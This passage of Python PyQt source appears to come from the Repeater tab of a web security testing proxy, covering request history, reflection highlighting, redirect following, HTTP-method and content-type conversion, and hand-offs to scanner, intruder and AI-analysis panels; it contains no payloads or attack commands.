        if "\r\n\r\n" in resp_text:
            headers_part, body_part = resp_text.split("\r\n\r\n", 1)
        elif "\n\n" in resp_text:
            headers_part, body_part = resp_text.split("\n\n", 1)
        else:
            headers_part, body_part = resp_text, ""

        # Pretty: try JSON regardless of Content-Type
        pretty_body = body_part
        try:
            _stripped = body_part.strip()
            if _stripped.startswith(("{", "[")):
                pretty_body = json.dumps(json.loads(_stripped), indent=2)
        except Exception:
            pass

        self.resp_pretty.setPlainText(headers_part + "\n\n" + pretty_body)
        self.resp_raw.setPlainText(resp_text)
        self.resp_headers.setPlainText(headers_part)

        # Apply reflection highlighting if enabled
        self._apply_reflection()

        # Save to history
        entry = {
            "request":  self.request_editor.toPlainText(),
            "response": resp_text,
            "elapsed":  elapsed_ms,
            "size":     size_bytes,
        }
        # Truncate forward history
        if self._history_pos < len(self._history) - 1:
            self._history = self._history[: self._history_pos + 1]
        self._history.append(entry)
        self._history_pos = len(self._history) - 1
        self._update_nav()

        self.status_bar.setText(
            f"✅  {status_code}  •  {elapsed_ms:.0f} ms  •  {self._format_size(size_bytes)}"
        )
        _scheme = "https" if self.ssl_check.isChecked() else "http"
        _url    = f"{_scheme}://{self.host_input.text()}"
        self._update_gql_state(_url, self.request_editor.toPlainText(), self.resp_raw.toPlainText())
        # JWT detection (don't disrupt active JWT view)
        if not self._jwt_req_mode and not self._jwt_resp_mode:
            self._update_jwt_state(self.request_editor.toPlainText(), self.resp_raw.toPlainText())
        # If this was an introspection request, check if it was blocked or wrong method
        if self._introspection_pending:
            self._introspection_pending = False
            _is_405 = status_code == "405"
            if _is_405 or self._is_introspect_blocked(resp_text):
                self._try_introspect_bypass()

    # ── Reflection helpers ────────────────────────────────────────────────────

    def _apply_reflection(self):
        """Extract request values and highlight reflections in response editors."""
        if not self.reflect_check.isChecked():
            # Clear any existing highlights
            self.resp_pretty.setExtraSelections([])
            self.resp_raw.setExtraSelections([])
            return

        raw_req = self.request_editor.toPlainText()
        values  = _extract_request_values(raw_req)

        highlight_reflections(self.resp_pretty, values)
        highlight_reflections(self.resp_raw, values)

        if values:
            found = sum(
                1 for v in values
                if v in self.resp_raw.toPlainText()
            )
            if found:
                self.status_bar.setText(
                    f"🔍  {found} reflected value{'s' if found > 1 else ''} found "
                    f"(highlighted in yellow)"
                )
                QTimer.singleShot(4000, lambda: self.status_bar.setText("Ready"))

    def _on_reflect_toggled(self, state: int):
        """Called when the Check Reflection checkbox is toggled."""
        if state:
            self._apply_reflection()
        else:
            self.resp_pretty.setExtraSelections([])
            self.resp_raw.setExtraSelections([])

    def _follow_redirect_action(self):
        resp_text = self.resp_raw.toPlainText()
        loc_m = re.search(r'^[Ll]ocation:\s*(.+)$', resp_text, re.MULTILINE)
        if not loc_m:
            return
            
        location = loc_m.group(1).strip()
        
        # Current context
        current_host = self.host_input.text().strip()
        current_port = self.port_input.text().strip()
        current_ssl = self.ssl_check.isChecked()
        
        scheme = "https" if current_ssl else "http"
        if (current_ssl and current_port == "443") or (not current_ssl and current_port == "80") or not current_port:
            netloc = current_host
        else:
            netloc = f"{current_host}:{current_port}"
            
        base_url = f"{scheme}://{netloc}"
        
        # Resolve location
        new_url_str = urllib.parse.urljoin(base_url, location)
        new_url = urllib.parse.urlparse(new_url_str)
        
        # Update UI
        self.host_input.setText(new_url.hostname)
        
        new_port = new_url.port
        if new_port is None:
            new_port = 443 if new_url.scheme == 'https' else 80
        self.port_input.setText(str(new_port))
        
        self.ssl_check.setChecked(new_url.scheme == 'https')
        
        # Update Request
        raw_req = self.request_editor.toPlainText()
        
        if "\r\n\r\n" in raw_req:
            headers_part, body_part = raw_req.split("\r\n\r\n", 1)
            eol = "\r\n"
        elif "\n\n" in raw_req:
            headers_part, body_part = raw_req.split("\n\n", 1)
            eol = "\n"
        else:
            headers_part, body_part = raw_req, ""
            eol = "\n"
            
        lines = headers_part.splitlines()
        if lines:
            req_line = lines[0]
            parts = req_line.split(' ')
            method = parts[0]
            
            # Handle method change for 301/302/303
            status_code = 0
            m = re.match(r'HTTP/\S+\s+(\d+)', resp_text)
            if m:
                status_code = int(m.group(1))
            
            if status_code == 303:
                method = 'GET'
                body_part = ""
            elif status_code in (301, 302) and method != 'HEAD':
                method = 'GET'
                body_part = ""
            
            path = new_url.path
            if not path: path = "/"
            if new_url.query:
                path += "?" + new_url.query
                
            ver = parts[2] if len(parts) > 2 else "HTTP/1.1"
            lines[0] = f"{method} {path} {ver}"
            
            # Update Host header
            new_host_val = new_url.hostname
            if (new_url.scheme == 'https' and new_port != 443) or (new_url.scheme == 'http' and new_port != 80):
                new_host_val = f"{new_url.hostname}:{new_port}"
            
            host_found = False
            for i in range(1, len(lines)):
                if lines[i].lower().startswith("host:"):
                    lines[i] = f"Host: {new_host_val}"
                    host_found = True
            if not host_found:
                lines.insert(1, f"Host: {new_host_val}")
                
            new_raw_req = eol.join(lines) + eol + eol + body_part
            self.request_editor.setPlainText(new_raw_req)
            
            self._send_request()

    def _on_send_error(self, error: str):
        self.send_btn.setEnabled(True)
        self.send_btn.setText("▶  Send")
        self.resp_pretty.setPlainText(f"[Connection Error]\n\n{error}")
        self.status_bar.setText(f"❌  Error: {error}")
        self.status_badge.setText("<b style='color:#e06c75;'>ERR</b>")

    def _format_size(self, n: int) -> str:
        if n < 1024:
            return f"{n} B"
        elif n < 1024 * 1024:
            return f"{n/1024:.1f} KB"
        else:
            return f"{n/1024/1024:.2f} MB"

    def _update_nav(self):
        total = len(self._history)
        pos   = self._history_pos + 1
        self.back_btn.setEnabled(self._history_pos > 0)
        self.fwd_btn.setEnabled(self._history_pos < total - 1)
        self.history_label.setText(f"{pos}/{total}" if total > 0 else "")

    def _history_back(self):
        if self._history_pos > 0:
            self._history_pos -= 1
            self._load_history_entry()

    def _history_fwd(self):
        if self._history_pos < len(self._history) - 1:
            self._history_pos += 1
            self._load_history_entry()

    def _load_history_entry(self):
        entry = self._history[self._history_pos]
        req = entry["request"]
        # Pretty-print JSON body in request
        _rsep = "\r\n\r\n" if "\r\n\r\n" in req else "\n\n"
        if _rsep in req:
            _rh, _rb = req.split(_rsep, 1)
            try:
                _rs = _rb.strip()
                if _rs.startswith(("{", "[")):
                    req = _rh + _rsep + json.dumps(json.loads(_rs), indent=2)
            except Exception:
                pass
        self.request_editor.setPlainText(req)
        resp  = entry["response"]
        if "\r\n\r\n" in resp:
            h, b = resp.split("\r\n\r\n", 1)
        elif "\n\n" in resp:
            h, b = resp.split("\n\n", 1)
        else:
            h, b = resp, ""
        try:
            _bs = b.strip()
            if _bs.startswith(("{", "[")):
                b = json.dumps(json.loads(_bs), indent=2)
        except Exception:
            pass
        self.resp_pretty.setPlainText(h + "\n\n" + b)
        self.resp_raw.setPlainText(resp)
        self.resp_headers.setPlainText(h)
        self.time_badge.setText(f"  {entry['elapsed']:.0f} ms")
        self.length_badge.setText(f"  {self._format_size(entry['size'])}")
        self._update_nav()

    def _send_to_comparer(self):
        """Attempt to bridge response to Comparer tab on parent GUI."""
        try:
            main_win = self.window()
            if hasattr(main_win, "add_comparison"):
                main_win.add_comparison(
                    self.name,
                    self.request_editor.toPlainText(),
                    self.resp_raw.toPlainText(),
                    "Repeater"
                )
                self.status_bar.setText("✅  Sent to Comparer")
                QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
        except Exception as e:
            logger.error(f"Send to comparer error: {e}")

    def _send_to_intruder(self):
        """Send the current request to the Intruder tab."""
        try:
            main_win = self.window()
            if not hasattr(main_win, "tab_widget"):
                return
            raw = self.request_editor.toPlainText()
            for i in range(main_win.tab_widget.count()):
                if "Intruder" in main_win.tab_widget.tabText(i):
                    intruder = main_win.tab_widget.widget(i)
                    if hasattr(intruder, "load_request"):
                        intruder.load_request(raw)
                    main_win.tab_widget.setCurrentIndex(i)
                    self.status_bar.setText("✅  Sent to Intruder")
                    QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
                    break
        except Exception as e:
            logger.error(f"Send to intruder error: {e}")

    def _send_to_scanner(self):
        """Send the current request to the Scanner tab."""
        try:
            main_win = self.window()
            if not hasattr(main_win, "scanner_tab"):
                return
            raw = self.request_editor.toPlainText()
            method, url = "GET", ""
            first_line = raw.split("\n")[0].strip() if raw else ""
            parts = first_line.split(" ")
            if len(parts) >= 2:
                method = parts[0]
                path   = parts[1]
                host   = self.host_input.text().strip()
                scheme = "https" if self.ssl_check.isChecked() else "http"
                url    = f"{scheme}://{host}{path}" if host else path
            request_data = {
                "url":           url,
                "method":        method,
                "request_text":  raw,
                "response_text": self.resp_raw.toPlainText(),
            }
            main_win.scanner_tab.add_request_to_queue(request_data)
            for i in range(main_win.tab_widget.count()):
                if "Scanner" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
            self.status_bar.setText("✅  Sent to Scanner")
            QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
        except Exception as e:
            logger.error(f"Send to scanner error: {e}")

    def _send_to_intruder(self):
        """Send the current request to the Intruder tab."""
        try:
            main_win = self.window()
            if not hasattr(main_win, "tab_widget"):
                return
            raw = self.request_editor.toPlainText()
            for i in range(main_win.tab_widget.count()):
                if "Intruder" in main_win.tab_widget.tabText(i):
                    intruder = main_win.tab_widget.widget(i)
                    if hasattr(intruder, "load_request"):
                        intruder.load_request(raw)
                    main_win.tab_widget.setCurrentIndex(i)
                    self.status_bar.setText("✅  Sent to Intruder")
                    QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
                    break
        except Exception as e:
            logger.error(f"Send to intruder error: {e}")

    def _send_to_scanner(self):
        """Send the current request to the Scanner tab."""
        try:
            main_win = self.window()
            if not hasattr(main_win, "scanner_tab"):
                return
            raw = self.request_editor.toPlainText()
            # Parse method and URL from raw request
            method, url = "GET", ""
            first_line = raw.split("\n")[0].strip() if raw else ""
            parts = first_line.split(" ")
            if len(parts) >= 2:
                method = parts[0]
                path   = parts[1]
                host   = self.host_input.text().strip()
                scheme = "https" if self.ssl_check.isChecked() else "http"
                url    = f"{scheme}://{host}{path}" if host else path
            request_data = {
                "url":           url,
                "method":        method,
                "request_text":  raw,
                "response_text": self.resp_raw.toPlainText(),
            }
            main_win.scanner_tab.add_request_to_queue(request_data)
            for i in range(main_win.tab_widget.count()):
                if "Scanner" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
            self.status_bar.setText("✅  Sent to Scanner")
            QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
        except Exception as e:
            logger.error(f"Send to scanner error: {e}")

    def _send_to_endpoints(self):
        """Send the current request to the Attack Surface tab."""
        try:
            main_win = self.window()
            if not hasattr(main_win, 'attack_surface_tab'):
                return
            raw = self.request_editor.toPlainText()
            method, path, url = "GET", "/", ""
            first_line = raw.split("\n")[0].strip() if raw else ""
            parts = first_line.split(" ")
            if len(parts) >= 2:
                method = parts[0]
                path   = parts[1]
            host   = self.host_input.text().strip()
            scheme = "https" if self.ssl_check.isChecked() else "http"
            url    = f"{scheme}://{host}{path}" if host else path
            finding = {
                "url":          url,
                "method":       method,
                "status":       "",
                "request_text": raw,
                "source":       "Repeater",
            }
            main_win.attack_surface_tab.add_from_http_history(finding)
            for i in range(main_win.tab_widget.count()):
                if "Attack Surface" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
            self.status_bar.setText("✅  Sent to Attack Surface")
            from PyQt5.QtCore import QTimer
            QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
        except Exception as e:
            logger.error(f"Send to attack surface error: {e}")

    def _send_to_report(self):
        """Open the Report Bug dialog pre-filled from the current Repeater request."""
        try:
            main_win = self.window()
            report_tab = getattr(main_win, 'report_tab', None)
            if report_tab is None or not hasattr(report_tab, 'add_from_finding'):
                from PyQt5.QtWidgets import QMessageBox
                QMessageBox.warning(self, "Report Bug", "Reports tab not found.")
                return
            raw = self.request_editor.toPlainText()
            method, path = "GET", "/"
            first_line = raw.split("\n")[0].strip() if raw else ""
            parts = first_line.split(" ")
            if len(parts) >= 2:
                method, path = parts[0], parts[1]
            host   = self.host_input.text().strip()
            scheme = "https" if self.ssl_check.isChecked() else "http"
            url    = f"{scheme}://{host}{path}" if host else path
            finding = {
                "url":    url,
                "method": method,
                "source": "Repeater",
            }
            report_tab.add_from_finding(finding)
            for i in range(main_win.tab_widget.count()):
                if "Report" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
            self.status_bar.setText("✅  Opened Report Bug dialog")
            from PyQt5.QtCore import QTimer
            QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))
        except Exception as e:
            logger.error(f"Send to report error: {e}")

    # ── AI Chat helpers ───────────────────────────────────────────────────────

    def _get_ai_panel(self):
        """Return the shared _AIChatPanel from the main window, or None."""
        try:
            return getattr(self.window(), '_ai_chat_panel', None)
        except Exception:
            return None

    def _get_ai_traffic_settings(self) -> dict:
        """Return AI settings from the main window."""
        try:
            main_win = self.window()
            if hasattr(main_win, '_ai_traffic_settings'):
                return main_win._ai_traffic_settings()
            gs = getattr(main_win, '_global_settings', None)
            if gs:
                return gs
        except Exception:
            pass
        return {}

    def _build_current_url(self) -> str:
        host   = self.host_input.text().strip()
        scheme = "https" if self.ssl_check.isChecked() else "http"
        raw    = self.request_editor.toPlainText()
        path   = "/"
        first  = raw.split("\n")[0].strip() if raw else ""
        parts  = first.split(" ")
        if len(parts) >= 2:
            path = parts[1]
        return f"{scheme}://{host}{path}" if host else path

    def _ensure_ai_panel_visible(self):
        """Reparent the shared AI panel into this tab's outer splitter and show it."""
        panel = self._get_ai_panel()
        if panel is None:
            return
        splitter = self._ai_outer_splitter
        if panel.parent() is not splitter:
            splitter.addWidget(panel)
        sizes = splitter.sizes()
        total = sum(sizes) or 1200
        if len(sizes) < 2 or sizes[-1] < 200:
            splitter.setSizes([max(300, int(total * 0.55)), max(350, int(total * 0.45))])
        settings = self._get_ai_traffic_settings()
        if settings and not panel._last_settings:
            panel._last_settings = settings

    def _ai_toggle_panel(self):
        """Toggle the shared AI chat panel inside this tab — no tab switching."""
        panel = self._get_ai_panel()
        if panel is None:
            return
        splitter = self._ai_outer_splitter
        if panel.parent() is not splitter:
            self._ensure_ai_panel_visible()
            return
        sizes = splitter.sizes()
        total = sum(sizes) or 1200
        if len(sizes) < 2 or sizes[-1] < 200:
            splitter.setSizes([max(300, int(total * 0.55)), max(350, int(total * 0.45))])
            settings = self._get_ai_traffic_settings()
            if settings and not panel._last_settings:
                panel._last_settings = settings
        else:
            splitter.setSizes([total, 0])

    def _ai_analyze(self):
        """Run a full AI security analysis on the current request/response."""
        panel = self._get_ai_panel()
        if panel is None:
            return
        settings = self._get_ai_traffic_settings()
        provider = settings.get("ai_provider", "openai")
        api_key  = settings.get("ai_api_key", "").strip()
        if provider != "ollama" and not api_key:
            from PyQt5.QtWidgets import QMessageBox
            QMessageBox.warning(self, "AI Analyze", "No AI API key configured.")
            return
        req_text  = self.request_editor.toPlainText()
        resp_text = self.resp_pretty.toPlainText() or self.resp_raw.toPlainText()
        url       = self._build_current_url()
        self._ensure_ai_panel_visible()
        panel.start_analysis(settings, req_text, resp_text, url)

    def _send_to_ai(self):
        """Pin the current request in the AI chat panel for open-ended Q&A."""
        panel = self._get_ai_panel()
        if panel is None:
            return
        settings = self._get_ai_traffic_settings()
        provider = settings.get("ai_provider", "openai")
        api_key  = settings.get("ai_api_key", "").strip()
        if provider != "ollama" and not api_key:
            from PyQt5.QtWidgets import QMessageBox
            QMessageBox.warning(self, "Send to AI", "No AI API key configured.")
            return
        req_text  = self.request_editor.toPlainText()
        resp_text = self.resp_pretty.toPlainText() or self.resp_raw.toPlainText()
        url       = self._build_current_url()
        self._ensure_ai_panel_visible()
        panel.set_context(settings, req_text, resp_text, url)

    def _get_current_response_editor(self):
        return self.resp_tabs.currentWidget()

    def _search_next_response(self):
        text = self.resp_search_input.text()
        if not text:
            return
        editor = self._get_current_response_editor()
        if isinstance(editor, QPlainTextEdit):
            if not editor.find(text):
                # Wrap around
                cursor = editor.textCursor()
                cursor.movePosition(QTextCursor.Start)
                editor.setTextCursor(cursor)
                editor.find(text)

    def _search_prev_response(self):
        text = self.resp_search_input.text()
        if not text:
            return
        editor = self._get_current_response_editor()
        if isinstance(editor, QPlainTextEdit):
            if not editor.find(text, QTextDocument.FindBackward):
                # Wrap around
                cursor = editor.textCursor()
                cursor.movePosition(QTextCursor.End)
                editor.setTextCursor(cursor)
                editor.find(text, QTextDocument.FindBackward)

    def _show_request_context_menu(self, pos):
        menu = self.request_editor.createStandardContextMenu()
        menu.addSeparator()

        # ── Copy URL ──────────────────────────────────────────────────────────
        copy_url_act = menu.addAction("  Copy URL")
        copy_url_act.triggered.connect(self._copy_url_from_request)

        # ── Change HTTP Method ────────────────────────────────────────────────
        method_menu = menu.addMenu("⚡  Change Method")
        method_menu.setStyleSheet(
            f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};}}"
            f"QMenu::item:selected{{background:{COLOR_HOVER};}}"
        )
        _HTTP_METHODS = [
            ("GET",     "Safe, no body"),
            ("POST",    "Submit data"),
            ("PUT",     "Replace resource"),
            ("PATCH",   "Partial update"),
            ("DELETE",  "Remove resource"),
            ("HEAD",    "Headers only"),
            ("OPTIONS", "Allowed methods"),
            ("TRACE",   "Loop-back test"),
            ("CONNECT", "Tunnel (proxy)"),
        ]
        # Detect current method to mark it
        _cur_method = ""
        _first_line = self.request_editor.toPlainText().splitlines()
        if _first_line:
            _cur_method = _first_line[0].split()[0].upper() if _first_line[0].split() else ""

        for _method, _desc in _HTTP_METHODS:
            _label = f"{'✔  ' if _method == _cur_method else '    '}{_method:<10}  {_desc}"
            _act = method_menu.addAction(_label)
            _act.triggered.connect(lambda checked, m=_method: self._change_http_method(m))

        # ── Content-Type Converter ────────────────────────────────────────────
        ct_menu = menu.addMenu("⇄  Convert Content-Type")
        ct_menu.setStyleSheet(
            f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};}}"
            f"QMenu::item:selected{{background:{COLOR_HOVER};}}"
        )
        ct_json    = ct_menu.addAction("→  application/json")
        ct_form    = ct_menu.addAction("→  application/x-www-form-urlencoded")
        ct_multi   = ct_menu.addAction("→  multipart/form-data")
        ct_xml     = ct_menu.addAction("→  application/xml")
        ct_plain   = ct_menu.addAction("→  text/plain")

        ct_json.triggered.connect(lambda: self._convert_content_type("application/json"))
        ct_form.triggered.connect(lambda: self._convert_content_type("application/x-www-form-urlencoded"))
        ct_multi.triggered.connect(lambda: self._convert_content_type("multipart/form-data"))
        ct_xml.triggered.connect(lambda: self._convert_content_type("application/xml"))
        ct_plain.triggered.connect(lambda: self._convert_content_type("text/plain"))

        # ── GraphQL ──────────────────────────────────────────────────────────
        gql_menu = menu.addMenu("⬡  GraphQL")
        gql_menu.setStyleSheet(
            f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};}}"
            f"QMenu::item:selected{{background:{COLOR_HOVER};}}"
        )
        gql_intro_act = gql_menu.addAction("⬡  Full Introspection")
        gql_intro_act.setToolTip("Send a full GraphQL introspection query and attempt bypass if blocked")
        gql_intro_act.triggered.connect(self._run_introspection_from_menu)

        menu.addSeparator()

        enc_menu = menu.addMenu("Encode/Decode")
        
        url_enc = enc_menu.addAction("URL Encode (Ctrl+U)")
        url_enc.triggered.connect(self._url_encode_selection)
        
        url_dec = enc_menu.addAction("URL Decode (Ctrl+Shift+U)")
        url_dec.triggered.connect(self._url_decode_selection)
        
        enc_menu.addSeparator()
        
        b64_enc = enc_menu.addAction("Base64 Encode (Ctrl+B)")
        b64_enc.triggered.connect(self._base64_encode_selection)
        
        b64_dec = enc_menu.addAction("Base64 Decode (Ctrl+Shift+B)")
        b64_dec.triggered.connect(self._base64_decode_selection)
        
        enc_menu.addSeparator()
        
        html_enc = enc_menu.addAction("HTML Encode")
        html_enc.triggered.connect(self._html_encode_selection)
        
        html_dec = enc_menu.addAction("HTML Decode")
        html_dec.triggered.connect(self._html_decode_selection)
        
        enc_menu.addSeparator()
        
        hex_enc = enc_menu.addAction("Hex Encode")
        hex_enc.triggered.connect(self._hex_encode_selection)
        
        hex_dec = enc_menu.addAction("Hex Decode")
        hex_dec.triggered.connect(self._hex_decode_selection)

        menu.addSeparator()
        send_intruder_act = menu.addAction("→  Send to Intruder")
        send_intruder_act.triggered.connect(self._send_to_intruder)
        send_scanner_act = menu.addAction("→  Send to Scanner")
        send_scanner_act.triggered.connect(self._send_to_scanner)
        send_endpoints_act = menu.addAction("→  Send to Attack Surface")
        send_endpoints_act.triggered.connect(self._send_to_endpoints)
        send_report_act = menu.addAction("�  Report Bug")
        send_report_act.triggered.connect(self._send_to_report)

        menu.addSeparator()
        ai_analyze_act = menu.addAction("✨ AI Analyze  (Ctrl+Shift+C)")
        ai_analyze_act.triggered.connect(self._ai_analyze)
        send_to_ai_act = menu.addAction("✨ Send to AI")
        send_to_ai_act.triggered.connect(self._send_to_ai)
        ai_payloads_act = menu.addAction(" AI Suggest Payloads")
        ai_payloads_act.setToolTip(
            "Select a parameter value in the request, then use this to generate AI bypass payloads"
        )
        ai_payloads_act.triggered.connect(self._open_ai_payloads_tab)

        menu.addSeparator()
        check_methods_act = menu.addAction("  Check HTTP Methods")
        check_methods_act.setToolTip("Probe all HTTP methods and method-override headers (X-HTTP-Method-Override etc.)")
        check_methods_act.triggered.connect(self._check_http_methods)

        check_env_act = menu.addAction("  Check Environments")
        check_env_act.setToolTip("Probe dev / staging / test / QA environment variants of this endpoint")
        check_env_act.triggered.connect(self._check_environments)

        clean_req_act = menu.addAction("  Clean Request")
        clean_req_act.setToolTip("Identify which headers and parameters are unnecessary by removing them one at a time")
        clean_req_act.triggered.connect(self._clean_request)

        menu.exec_(self.request_editor.mapToGlobal(pos))

    # ── Change HTTP Method ────────────────────────────────────────────────────

    def _change_http_method(self, new_method: str):
        """Replace the HTTP method on the first request line, with intelligent parameter conversion."""
        raw = self.request_editor.toPlainText()
        lines = raw.splitlines(keepends=True)
        if not lines:
            return
        first = lines[0].rstrip("\r\n")
        parts = first.split(" ", 2)  # METHOD /path HTTP/x.x
        if len(parts) < 2:
            return

        old_method = parts[0].upper()
        if old_method == new_method:
            return  # nothing to do

        # Detect line endings
        eol = "\r\n" if lines[0].endswith("\r\n") else "\n"

        # Split headers and body
        raw_new = "".join(lines)
        if "\r\n\r\n" in raw_new:
            header_part, body = raw_new.split("\r\n\r\n", 1)
            body_sep = "\r\n"
        elif "\n\n" in raw_new:
            header_part, body = raw_new.split("\n\n", 1)
            body_sep = "\n"
        else:
            header_part, body = raw_new, ""
            body_sep = "\n"

        body = body.rstrip()
        path = parts[1]

        no_body_methods = {"GET", "HEAD", "OPTIONS", "TRACE", "DELETE"}
        has_body_methods = {"POST", "PUT", "PATCH", "CONNECT"}

        # ── Extract current Content-Type ──────────────────────────────────────
        ct_match = re.search(r'^(Content-Type):\s*([^\r\n]+)', header_part, re.MULTILINE | re.IGNORECASE)
        current_ct = ct_match.group(2).strip().lower() if ct_match else ""

        # ── Case 1: Changing FROM bodyless → WITH body (e.g., GET → POST) ─────
        if old_method in no_body_methods and new_method in has_body_methods:
            # Move URL params to body
            if "?" in path:
                path_part, query_string = path.split("?", 1)
                # Parse query params
                try:
                    params = {k: v for k, v in urllib.parse.parse_qsl(query_string, keep_blank_values=True)}
                except Exception:
                    params = {}

                if params:
                    # Remove query from path
                    parts[1] = path_part
                    
                    # Set body based on Content-Type
                    if "json" in current_ct or not current_ct:
                        # Default to JSON if no Content-Type
                        body = json.dumps(params, indent=2)
                        if not ct_match:
                            # Add Content-Type header
                            header_part += eol + "Content-Type: application/json"
                    elif "x-www-form-urlencoded" in current_ct:
                        body = urllib.parse.urlencode(params)
                    else:
                        # For other types, try JSON as default
                        body = json.dumps(params, indent=2)
                        if not ct_match:
                            header_part += eol + "Content-Type: application/json"

        # ── Case 2: Changing FROM WITH body → bodyless (e.g., POST → GET) ─────
        elif old_method in has_body_methods and new_method in no_body_methods:
            # Move body params to URL
            params = {}

            if body:
                if "json" in current_ct:
                    try:
                        parsed = json.loads(body)
                        if isinstance(parsed, dict):
                            params = parsed
                    except Exception:
                        pass
                elif "x-www-form-urlencoded" in current_ct:
                    try:
                        params = {k: v for k, v in urllib.parse.parse_qsl(body, keep_blank_values=True)}
                    except Exception:
                        pass
                else:
                    # Try to parse as key=value pairs
                    try:
                        params = {k: v for k, v in urllib.parse.parse_qsl(body, keep_blank_values=True)}
                    except Exception:
                        pass

            if params:
                # Remove existing query string if present
                if "?" in path:
                    path = path.split("?")[0]
                
                # Append params as query string
                query_string = urllib.parse.urlencode(params)
                parts[1] = f"{path}?{query_string}"
            
            body = ""

        # ── Case 3: Changing between two bodyless or both with body ───────────
        elif old_method in no_body_methods and new_method in no_body_methods:
            # Just remove body if present
            body = ""
        elif old_method in has_body_methods and new_method in has_body_methods:
            # Keep body as-is (both accept bodies)
            pass

        # ── Update first line ─────────────────────────────────────────────────
        parts[0] = new_method
        first_line_new = " ".join(parts)
        header_lines = header_part.splitlines()
        header_lines[0] = first_line_new

        # ── Remove/update headers for bodyless methods ────────────────────────
        if new_method in no_body_methods:
            header_lines = [
                line for line in header_lines
                if not re.match(r'content-(length|type)\s*:', line, re.IGNORECASE)
            ]
            body = ""
        else:
            # For methods with body, update Content-Length
            body_bytes = body.encode("utf-8", errors="replace")
            body_len = len(body_bytes)
            
            has_content_length = False
            for i, line in enumerate(header_lines):
                if re.match(r'content-length\s*:', line, re.IGNORECASE):
                    header_lines[i] = f"Content-Length: {body_len}"
                    has_content_length = True
            
            if not has_content_length and body:
                header_lines.append(f"Content-Length: {body_len}")

        # ── Rebuild request ──────────────────────────────────────────────────
        header_part_new = eol.join(header_lines)
        if body:
            raw_new = header_part_new + eol + eol + body
        else:
            raw_new = header_part_new + eol + eol

        self.request_editor.setPlainText(raw_new)
        self.status_bar.setText(f"⚡  Method changed to {new_method} • Parameters converted")
        QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

    # ── Copy URL ──────────────────────────────────────────────────────────────

    def _copy_url_from_request(self):
        """Build and copy the full URL from the request line + Host header."""
        raw = self.request_editor.toPlainText()
        lines = raw.splitlines()
        if not lines:
            return

        # First line: METHOD /path HTTP/x.x
        first_line = lines[0].strip()
        parts = first_line.split()
        if len(parts) < 2:
            return
        path = parts[1]

        # If path is already an absolute URL (e.g. CONNECT or full URL), use as-is
        if path.startswith("http://") or path.startswith("https://"):
            self._copy_text(path)
            return

        # Extract Host header
        host_val = self.host_input.text().strip()
        for line in lines[1:]:
            if line.lower().startswith("host:"):
                host_val = line.split(":", 1)[1].strip()
                break

        scheme = "https" if self.ssl_check.isChecked() else "http"
        port = self.port_input.text().strip()

        # Only include port in URL if non-standard
        if (scheme == "https" and port not in ("443", "")) or \
           (scheme == "http"  and port not in ("80",  "")):
            # host_val may already contain port from Host header — avoid duplicating
            if ":" not in host_val:
                host_val = f"{host_val}:{port}"

        url = f"{scheme}://{host_val}{path}"
        self._copy_text(url)

    # ── Content-Type Converter ────────────────────────────────────────────────

    def _convert_content_type(self, target_ct: str):
        """
        Convert the request body to match *target_ct* and update the
        Content-Type header accordingly.

        Supported conversions (best-effort):
          • any  →  application/json
          • any  →  application/x-www-form-urlencoded
          • any  →  multipart/form-data
          • any  →  application/xml
          • any  →  text/plain
        """
        raw = self.request_editor.toPlainText()

        # Split headers / body
        if "\r\n\r\n" in raw:
            header_part, body = raw.split("\r\n\r\n", 1)
            sep = "\r\n"
        elif "\n\n" in raw:
            header_part, body = raw.split("\n\n", 1)
            sep = "\n"
        else:
            # No body — just update the Content-Type header
            header_part, body, sep = raw, "", "\n"

        body = body.strip()

        # Detect current Content-Type
        ct_match = re.search(r'^(Content-Type):\s*([^\r\n]+)', header_part, re.MULTILINE | re.IGNORECASE)
        current_ct = ct_match.group(2).strip().lower() if ct_match else ""

        # ── Parse body into a generic key-value dict (best-effort) ────────────
        kv: Dict[str, Any] = {}

        if "json" in current_ct:
            try:
                kv = json.loads(body)
            except Exception:
                kv = {"data": body}
        elif "x-www-form-urlencoded" in current_ct:
            try:
                kv = {k: v for k, v in urllib.parse.parse_qsl(body, keep_blank_values=True)}
            except Exception:
                kv = {"data": body}
        elif "multipart/form-data" in current_ct:
            # Extract boundary
            bnd_m = re.search(r'boundary=([^\s;]+)', current_ct)
            if bnd_m:
                boundary = bnd_m.group(1).strip('"')
                parts_raw = re.split(r'--' + re.escape(boundary), body)
                for p in parts_raw:
                    nm = re.search(r'name="([^"]+)"', p)
                    if nm:
                        value = re.sub(r'^.*?\r?\n\r?\n', '', p, count=1, flags=re.DOTALL).strip()
                        kv[nm.group(1)] = value
            else:
                kv = {"data": body}
        elif "xml" in current_ct:
            # Very naive XML → dict: grab leaf text nodes
            for m in re.finditer(r'<(\w+)[^>]*>([^<]*)</\1>', body):
                kv[m.group(1)] = m.group(2)
            if not kv:
                kv = {"data": body}
        else:
            # text/plain or unknown — split on & or newlines
            if "&" in body or "=" in body:
                try:
                    kv = {k: v for k, v in urllib.parse.parse_qsl(body, keep_blank_values=True)}
                except Exception:
                    kv = {"data": body}
            else:
                kv = {"data": body} if body else {}

        # ── Serialise body to target format ───────────────────────────────────
        new_ct_header = target_ct

        if target_ct == "application/json":
            new_body = json.dumps(kv, indent=2) if kv else "{}"

        elif target_ct == "application/x-www-form-urlencoded":
            new_body = urllib.parse.urlencode(
                {k: json.dumps(v, separators=(',', ':')) if isinstance(v, (dict, list)) else str(v)
                 for k, v in kv.items()}
